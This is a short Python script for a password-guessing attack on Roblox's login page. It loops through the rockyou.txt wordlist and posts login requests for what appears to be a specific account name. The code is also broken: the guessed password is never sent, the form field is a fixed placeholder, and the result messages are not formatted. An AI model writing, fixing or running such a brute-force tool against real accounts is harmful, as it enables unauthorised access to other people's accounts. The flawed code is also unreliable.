import requests

url = 'https://www.roblox.com/NewLogin'

# 'r' for read
arg = open('rockyou.txt', 'r')

for line in arg:
    password = line.strip()
    http = requests.post(url, data={'form1': 'marcasellkhelaifi'})
    content = http.content

    if "What's on your mind" in content:
        print("Password found: +password+")
        break
    else:
        print("password incorrect.. +password+")
